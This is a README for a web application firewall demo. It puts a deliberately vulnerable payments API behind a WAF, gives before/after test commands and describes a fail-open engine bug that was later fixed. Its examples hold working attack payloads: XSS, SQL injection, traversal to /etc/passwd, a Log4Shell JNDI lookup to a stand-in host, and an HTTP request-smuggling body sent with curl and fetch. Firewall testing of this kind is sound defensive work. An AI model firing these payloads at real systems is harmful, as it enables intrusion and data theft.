# wslproxy WAF demo — "before / after", F5-style

A self-contained demonstration that puts a deliberately-vulnerable **payments API**
behind the wslproxy WAF and shows, side by side, what a WAF stops. It covers the
OWASP Top 10 **and** modern classes an API-era WAF must handle — SSTI, Log4Shell,
Spring4Shell, SSRF, NoSQL injection, XXE, JWT `alg:none`, prototype pollution,
GraphQL introspection, mass assignment, HTTP request smuggling (CWE-444) and
scanner recon.

```
                         ┌─────────────────────────── same origin ───────────────────────────┐
 payments-open.…    ───► wslproxy (lon1 edge)  ──►  Acme Pay (k3s1, cloud001, NodePort 30084)
   (WAF OFF)              proxy only
 payments-secure.… ───► wslproxy (lon1 edge)  ──►  Acme Pay
   (WAF ON, block)        WAF: waf-policy-payments-hard (37 rules, block mode)
```

Both hostnames point at the **same** vulnerable origin. The only difference is
whether the wslproxy WAF is bound — so every "before/after" pair is apples-to-apples.

## Live hosts

| Host | WAF | Role |
|------|-----|------|
| https://payments-open.fictionally.org   | off            | BEFORE — origin fully exposed |
| https://payments-secure.fictionally.org | on, block mode | AFTER — wslproxy WAF in front  |

## Test payments-secure.fictionally.org — the simplest way

**One curl** — fire an attack and look for `403` + `x-waf-block: true`:

```bash
curl -i "https://payments-secure.fictionally.org/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
# → HTTP/2 403 ... x-waf-block: true ... x-waf-rule: waf-rule-xss-001
```

The **HTTP request smuggling** rule — a second request line pipelined in the body:

```bash
printf '%b' '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n' \
| curl -i -H 'Content-Type: text/plain' --data-binary @- \
    https://payments-secure.fictionally.org/api/batch
# → HTTP/2 403 ... x-waf-block: true ... x-waf-rule: waf-rule-smuggling-001
```

**One command, several checks** — the bundled `curl`-only smoke test (no Python/deps),
which asserts the secure host blocks attacks (`403` + `X-WAF-Block`) and passes benign
traffic (`200`):

```bash
./test-secure.sh
# ── WAF smoke test → https://payments-secure.fictionally.org
#   [PASS] XSS <script>          expect=block status=403  rule=waf-rule-xss-001
#   [PASS] SQLi UNION            expect=block status=403  rule=waf-rule-sqli-001
#   [PASS] Path traversal        expect=block status=403  rule=waf-rule-lfi-001
#   [PASS] Log4Shell JNDI        expect=block status=403  rule=waf-rule-ssrf-002
#   [PASS] HTTP req smuggling    expect=block status=403  rule=waf-rule-smuggling-001
#   [PASS] Benign request        expect=allow status=200
#   6 passed, 0 failed
./test-secure.sh https://payments-secure.fictionally.org   # or pass an explicit host
```

### From a browser

The WAF inspects the URL, so **GET** attacks trigger a block you can *see* — paste one
into the address bar and you get the branded **403 “Request blocked”** page (with a
Support ID) instead of the app:

```
https://payments-secure.fictionally.org/search?q=<script>alert(1)</script>
https://payments-secure.fictionally.org/products?cat=x' UNION SELECT * FROM users--
https://payments-secure.fictionally.org/statement?file=../../../../etc/passwd
https://payments-secure.fictionally.org/lookup?user=${jndi:ldap://evil.example/a}
```

Open the **same URL on the unprotected host** to see the “before” — the origin processes
it: `https://payments-open.fictionally.org/search?q=<script>alert(1)</script>`.

To confirm it was the WAF (not the app), open **DevTools → Network**, click the request,
and read the response headers: `x-waf-block: true`, `x-waf-rule: …`, `x-support-id: …`.

POST-only attacks (smuggling, NoSQLi, mass-assignment) aren’t reachable from the address
bar — run them from the **DevTools Console** with `fetch()`. The HTTP request smuggling one:

```js
fetch("https://payments-secure.fictionally.org/api/batch", {
  method: "POST", headers: {"Content-Type": "text/plain"},
  body: '{"batch":"noop"}\r\n0\r\n\r\nGET /api/accounts/9999 HTTP/1.1\r\nHost: x\r\n\r\n'
}).then(r => console.log(r.status, r.headers.get("x-waf-rule")));
// → 403 waf-rule-smuggling-001
```

(The block page itself is served for navigations; for `fetch()` the browser exposes the
status and the `x-waf-*` headers as above.)

> Note: the smoke test only asserts *blocked* (`403` + `X-WAF-Block`), not which rule.
> The updated policy is imported to the live edge, so the smuggling payload is stopped by
> `waf-rule-smuggling-001`. (On an edge that hasn't imported it yet, an undeclared
> `/api/batch` is instead stopped by the OpenAPI positive-security stage,
> `VIOL_OPENAPI_PATH` — both are a `403` block, so the test passes either way.) For the
> full assertion matrix (which rule fired, plus the open-host control) use
> `test_waf_live.py` below.

## Result (20 attacks)

```
OPEN   (no WAF):        19/20 attacks exploit the origin
SECURE (wslproxy WAF):  19/20 of those blocked (403 + X-WAF-Rule)
```

The single attack the WAF does **not** block is **BOLA / IDOR**
(`GET /api/accounts/9999`). That is deliberate and honest: object-level
authorization is a business-logic flaw with no malicious signature in the
request — no signature WAF (F5 included) blocks it by payload inspection. The
mitigation is app-side authz or a positive-security/allow-list model, not a
signature. Showing this gap is the point: a WAF is necessary, not sufficient.

### Honest scope of the request-smuggling defence

Classic **CL.TE / TE.CL** smuggling is a *wire-framing* attack: it depends on how
raw bytes are split between the front-end and back-end, so the malicious frame is
constructed at the TCP layer, and a modern OpenResty/nginx front-end rejects the
crudest ambiguity (Content-Length *and* Transfer-Encoding together) with a `400`
before any Lua runs. So the WAF is not the *only* line of defence here, and the
demo does not pretend a Python HTTP client can put a true byte-level desync on the
wire. What the WAF layer adds — and what this demo actually exercises — is two
real controls:

1. **Signature (`waf-rule-smuggling-001`, `target: all`)** catches the visible
   artefact of a smuggling payload: a *second* HTTP request line pipelined inside
   a request body (the `0⏎⏎GET /admin HTTP/1.1…` that Examples 1–3 of the PortSwigger/
   OWASP write-ups embed). A normal client can send this as a plain body, so it is
   what the live matrix fires — `POST /api/batch` with a smuggled `GET
   /api/accounts/9999`. WAF off → the origin desyncs and leaks the treasury
   account; WAF on → `403` + `X-WAF-Rule: waf-rule-smuggling-001`.
2. **Stage (`smuggling`, `VIOL_SMUGGLING`)** is a first-class header-relationship
   check — `Content-Length`+`Transfer-Encoding`, duplicate/obfuscated
   `Transfer-Encoding`, malformed `Content-Length`. It is belt-and-suspenders at
   the outer edge (nginx pre-empts the worst) but genuinely load-bearing at the
   **inner** edge of the two-proxy topology (§10 of the top-level `CLAUDE.md`),
   where an upstream proxy can forward a `Transfer-Encoding` header that only this
   layer sees.

See `results.sample.json` for the full machine-readable matrix (per-attack rule
attribution), and the published dashboard for the visual before/after.

## Components

| Path | What |
|------|------|
| `app/app.py` | Acme Pay — the vulnerable payments API (Python stdlib, no deps). Each handler genuinely *processes* the payload — safely simulated in-process (no real shell/egress/secrets) — so "before" shows real impact. |
| `k3s1-payments-api.yaml` | Namespace + Deployment (pinned to **cloud001**, the lon1 edge node) + NodePort 30084. App source is carried in a ConfigMap on a stock `python:3.12-alpine` image — no image build/registry push. |
| `gen_waf_rules.py` | Generates the 16 modern/API `waf_rules` + the hardened `waf-policy-payments-hard` policy. Patterns are authored as Python strings so JSON escaping is correct. |
| `data/waf_rules/prod/*.json` | The new rule set (SSTI, Log4Shell ×2, Spring4Shell, SSRF ×2, NoSQLi, XXE, JWT-none, prototype pollution, GraphQL, open-redirect, scanner-UA, encoded-traversal, cmdi, mass-assignment, **HTTP request smuggling**). |
| `data/waf_policies/prod/waf-policy-payments-hard.json` | Block-mode policy referencing the 20 base OWASP rules + these 17 = 37 rules, anomaly threshold 6, branded 403 block page. Also carries the `smuggling` stage config. |
| `data/rules/prod/payments-demo-default.json` | wslproxy routing rule (305 proxy → `127.0.0.1:30084`). |
| `data/servers/prod/host:payments-{open,secure}.fictionally.org.json` | The two vhosts — identical except `waf_enabled` / `waf_policy_id` / `waf_mode_override`. |
| `attack_suite.py` | Fires the 20 attacks at both hosts and prints the before/after matrix (`--json` for machine output). |
| `test_waf_live.py` | CI-oriented live matrix — **every** payments-hard signature + v2 stage. Asserts secure blocks / open does not. Used by `.github/workflows/waf-validate.yml` on main + `workflow_dispatch`. |
| `test-secure.sh` | Simplest smoke test — pure `curl`, no deps. Fires a few attacks (incl. smuggling) + a benign control at `payments-secure` and asserts `403`+`X-WAF-Block` / `200`. See *"Test payments-secure — the simplest way"* above. |
| `gen_waf_landing.py` → `waf-rules.html` | **WAF rule-library landing page** — a searchable/filterable catalogue of all 50 rules (37 signatures + 13 enforcement stages), each expandable to what it detects, how the attack works, an example payload, the detection pattern/stage, mitigation and references. Opens on an HTTP request-smuggling explainer. Generated from the shipped rule JSON so it can't drift; edit the generator, not the HTML. |

## How it was deployed

1. **Origin** → `kubectl apply -f k3s1-payments-api.yaml` then load the app source:
   `kubectl -n wslproxy-waf-demo create configmap payments-api-src --from-file=app.py=app/app.py -o yaml --dry-run=client | kubectl apply -f -`.
   Pods are pinned to **cloud001** because the edge↔LAN pod overlay isn't routable
   from the edge nodes, so the lon1 wslproxy reaches the app on `127.0.0.1:30084`.
2. **WAF rules/policy/route/servers** → pushed to the lon1 control plane via
   `POST /api/projects/import` (dataType `waf_rules`, `waf_policies`, `rules`,
   `servers`). **Gotcha:** that endpoint form-parses the JSON body
   (`ngx.req.get_post_args` → `Helper.GetPayloads`), so a body containing `&` or
   `=` (our `&&` cmdi regex, the base64 block page) is truncated → HTTP 500.
   Percent-encode the whole JSON body before POSTing; the gateway decodes it back.
3. **DNS** → Cloudflare CNAMEs `payments-{open,secure}.fictionally.org → lon1.pop0.uk`
   (unproxied, so auto-ssl solves ACME HTTP-01). Certs issue on first HTTPS hit.

## The bug this demo surfaced (and fixed)

The wslproxy WAF had **never actually blocked anything** on this edge. The engine
called `ngx.re.compile()` in `api/waf_engine.lua`, but **OpenResty has no
`ngx.re.compile`** — every regex rule threw `attempt to call field 'compile' (a
nil value)`, and the fail-open wrapper swallowed it, so all traffic passed. It went
unnoticed because no vhost had a WAF policy bound until this demo.

Fix (`api/waf_engine.lua`): drop the fake compile step and pass the pattern
straight to `ngx.re.find(value, pattern, "jois")` — the `o` flag makes OpenResty
compile-once and cache per worker. Only vhosts with `waf_enabled=true` are
affected (the engine returns early otherwise), so the blast radius is this demo.

## Reproduce the before/after

```bash
python3 examples/wslproxy-waf-demo/attack_suite.py \
  --open   https://payments-open.fictionally.org \
  --secure https://payments-secure.fictionally.org
```

## CI live matrix (all rules)

```bash
# Defaults: payments-secure (must block) + payments.fictionally.org (must not)
python3 examples/wslproxy-waf-demo/test_waf_live.py -v

# Custom hosts / secure-only
WAF_SECURE_HOST=https://payments-secure.fictionally.org \
WAF_OPEN_HOST=https://payments.fictionally.org \
  python3 examples/wslproxy-waf-demo/test_waf_live.py -v
```

GitHub Actions: **WAF — validate & live attack matrix** runs offline schema checks on every WAF-touched PR/push, and the live matrix on **merge to `main`**, PRs that touch WAF paths, and **workflow_dispatch** (hosts overridable).

## WAF v2 — enterprise enforcement (beyond signatures)

The same policy also exercises the v2 engine (`api/waf_engine.lua` +
`api/waf_stages.lua` + `api/waf_support.lua`) — the controls a signature list
can't express. Design reference: [`docs/WAF_ENGINE_V2.md`](../../docs/WAF_ENGINE_V2.md);
policy JSON Schema: [`docs/waf-policy.schema.json`](../../docs/waf-policy.schema.json).

| Capability | Policy field | Demo behaviour | Violation |
|---|---|---|---|
| Method allow-list | `methods.allow` | `PUT /api/profile` → 403 | `VIOL_METHOD` |
| Filetype deny | `filetypes.deny` | `/config.env`, `/.git/config` → 403 | `VIOL_FILETYPE` |
| JWT algorithm policy | `jwt.denyAlg`/`requireAlg` | `alg:none` & `HS256` bearer → 403 (first-class, not a regex) | `VIOL_JWT_ALG` |
| JSON body profile | `jsonProfile.maxDepth`/`maxBytes` | deep or oversized JSON → 403 | `VIOL_JSON_DEPTH` / `VIOL_JSON_SIZE` |
| Brute-force velocity | `bruteForce[]` | 6th `POST /api/login` in 60s → 403 | `VIOL_BRUTE_FORCE` |
| IP / geo lists | `ipLists`, `geo.denyCountries` | allow-list bypass; country deny | `VIOL_IP_DENY` / `VIOL_GEO` |
| HTTP request smuggling | `smuggling` (stage) + `waf-rule-smuggling-001` (signature) | body-embedded `GET /admin HTTP/1.1` → 403; `Content-Length`+`Transfer-Encoding` / obfuscated TE header → 403 | `VIOL_SMUGGLING` / signature |
| Signature staging | `signatures.stage[]` | open-redirect rule alarms (302), never blocks, until its date | — |
| Set / per-ID governance | `signatureSets`, `signatures.disable` | toggle a whole set to alarm-only, or disable one ID | — |
| Binding precedence | `routeOverrides[]` | `/preview` runs transparent while the domain blocks (route > server > domain) | — |
| Correlation IDs | (always) | every block returns `X-Support-ID` + prints it on the block page | — |
| Structured security log | `logging` | one `wafsec {...}` JSON line per decision (support_id, code, stage, signature_id, policy, binding, latency_us) | — |

Every one of these is proved by a golden test:

```bash
python3 examples/wslproxy-waf-demo/waf_features.py \
  --host https://payments-secure.fictionally.org
# → 16/16 golden tests passed
```

### The engine bug this depended on

v2 only works because the signature matcher works — and it didn't. See the
callout above: the engine called the non-existent `ngx.re.compile()`, so every
regex rule failed open. Fixed to `ngx.re.find(v, pattern, "jois")`.
